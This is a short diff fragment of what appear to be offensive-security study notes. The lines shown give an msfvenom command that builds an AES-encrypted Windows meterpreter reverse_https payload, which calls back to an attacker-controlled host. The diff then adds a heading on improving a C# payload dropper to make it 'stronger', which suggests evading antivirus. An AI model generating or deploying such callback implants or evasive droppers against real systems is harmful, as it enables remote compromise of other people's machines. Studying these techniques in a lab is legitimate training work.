@@ -56,3 +56,6 @@ Let's encrypt with AES and see
 ```
 kali@kali:~$ sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=IP PORT=443 --encrypt aes256 --encrypt-key fdgdgj93traskfaswergfsdfg33 -f exe -o met64_aes.exe
 ```
+
+## Play with C#
+Let's modify this [banana C# payload dropper](/03ProcessInjectionMigration/Program.cs) to make it stronger and better. 
